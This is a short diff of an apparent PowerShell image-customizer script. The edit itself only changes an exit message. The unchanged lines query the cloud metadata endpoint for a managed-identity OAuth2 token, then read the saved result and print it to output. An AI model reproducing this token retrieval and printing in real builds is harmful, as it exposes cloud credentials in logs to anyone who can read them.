@@ -4,4 +4,4 @@ Invoke-WebRequest "http://169.254.169.254/metadata/identity/oauth2/token?api-ver
 $result=Get-Content "meta.txt"
 Write-Output "Finishing up..."
 Write-Output $result
-Write-Output "Exiting image customizer" | timestamp
+Write-Output "Exiting" | timestamp
